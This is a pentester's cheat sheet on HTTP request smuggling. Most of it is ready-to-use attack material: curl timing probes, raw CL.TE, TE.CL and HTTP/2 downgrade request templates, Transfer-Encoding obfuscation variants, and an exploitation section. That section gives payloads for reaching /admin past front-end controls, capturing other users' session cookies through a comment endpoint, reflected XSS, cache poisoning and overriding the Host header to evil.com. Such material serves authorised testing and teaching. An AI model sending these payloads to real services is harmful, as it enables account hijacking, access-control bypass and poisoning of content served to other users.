
## Table of Contents

- [[#Detection & Identification]]
- [[#CL.TE Smuggling]]
- [[#TE.CL Smuggling]]
- [[#TE.TE Obfuscation]]
- [[#Exploiting Smuggling]]
- [[#HTTP/2 Downgrade Smuggling]]

---

## Detection & Identification

Target sits behind a reverse proxy/load balancer/CDN i.e. any multi-tier HTTP stack

```bash
# Prerequisites: look for these in responses:
# - Via: header (proxy present)
# - X-Forwarded-For header
# - Server: nginx + app server combo
# - CDN headers (CF-RAY, X-Cache, etc.)

# Timing-based detection: CL.TE
# Send request where frontend uses Content-Length, backend uses Transfer-Encoding
# The backend will hang waiting for the next chunk if vulnerable
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "https://target.com/" \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  -d $'1\r\nA\r\nX'
# If >5 seconds = likely CL.TE vulnerable

# Timing-based detection: TE.CL
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "https://target.com/" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX'
# If >5 seconds = likely TE.CL vulnerable

# Use Burp Suite HTTP Request Smuggler extension for automated detection
# Repeater - right-click - Extensions - HTTP Request Smuggler - Smuggle Probe
```

**Important:** Always test in Burp Repeater with `"Update Content-Length"` turned `OFF` and HTTP/1.1 forced. Smuggling requires precise byte counts.

---

## CL.TE Smuggling

Front-end uses Content-Length, backend uses Transfer-Encoding

```
# CL.TE basic smuggle template
# Send via Burp Repeater (disable auto Content-Length update)

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```bash
# Confirm CL.TE by smuggling a prefix that causes next request to get 404
# Request 1 (smuggle):
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404notexist HTTP/1.1
X-Foo: x

# Request 2 (normal, sent immediately after):
POST / HTTP/1.1
Host: target.com
Content-Length: 0

# If request 2 returns 404 = confirmed CL.TE
```

---

## TE.CL Smuggling

Front-end uses Transfer-Encoding, backend uses Content-Length

```
# TE.CL basic template
# Note: Content-Length must equal byte count of everything AFTER headers

POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

```bash
# Confirm TE.CL
# Smuggle a request to a non-existent path
# If second normal request returns 404 = confirmed TE.CL
```

---

## TE.TE Obfuscation

If both frontend and backend support Transfer-Encoding then trick one into ignoring it

```Note
Obfuscate Transfer-Encoding header so one server ignores it
```

## Variations to try:

```
Transfer-Encoding: xchunked  
Transfer-Encoding: chunked  
Transfer-Encoding: chunked  
Transfer-Encoding: x  
Transfer-Encoding:[tab]chunked  
[space]Transfer-Encoding: chunked  
X: X[\n]Transfer-Encoding: chunked  
Transfer-Encoding  
: chunked  
Transfer-Encoding: CHUNKED  
Transfer-Encoding: Chunked
```

---

## Exploiting Smuggling

```bash
# 1. Bypass front-end security controls
# Smuggle request to restricted endpoint
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

# 2. Capture other users' requests (cookie/token theft)
# Smuggle a prefix that appends next user's request to a storage endpoint
POST / HTTP/1.1
Host: target.com
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
Content-Length: 400
Content-Type: application/x-www-form-urlencoded

comment=smuggled_prefix_here_next_request_appended_as_comment_body

# 3. Reflected XSS via smuggling
# Smuggle a request that triggers XSS in the victim's browser
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

GET /xss?q="><script>alert(1)</script> HTTP/1.1
Host: target.com
X-Ignore: X
"

# 4. Web cache poisoning via smuggling
# Smuggle a response that gets cached against a legit URL
POST / HTTP/1.1
Host: target.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /static/legit.js HTTP/1.1
Host: target.com

# 5. Host header override via smuggled prefix
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: evil.com
Content-Length: 5

x=1
```

---

## HTTP/2 Downgrade Smuggling

```bash
# H2.CL: HTTP/2 frontend, HTTP/1 backend, Content-Length injected
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually in the request (Burp allows this in HTTP/2)

POST / HTTP/2
Host: target.com
Content-Length: 0

GET /admin HTTP/1.1
Host: target.com

# H2.TE: inject Transfer-Encoding via HTTP/2 header
# HTTP/2 normally strips TE headers, but some backends are fooled
# Add header: transfer-encoding: chunked (lowercase in HTTP/2)

POST / HTTP/2
Host: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

# Request tunnel via HTTP/2: CRLF injection in header value
# If HTTP/2 headers aren't sanitized before passing to HTTP/1 backend:
# Header name: foo
# Header value: bar\r\nTransfer-Encoding: chunked

# Use Burp's HTTP Request Smuggler extension for H2 attacks
# It handles the byte-level complexity automatically
```

HTTP Request Smuggling is extremely sensitive to white-space and byte counts. Always use Burp Repeater, disable "Update Content-Length", and send with HTTP/1.1. Use the HTTP Request Smuggler Burp extension before manual attempts.

---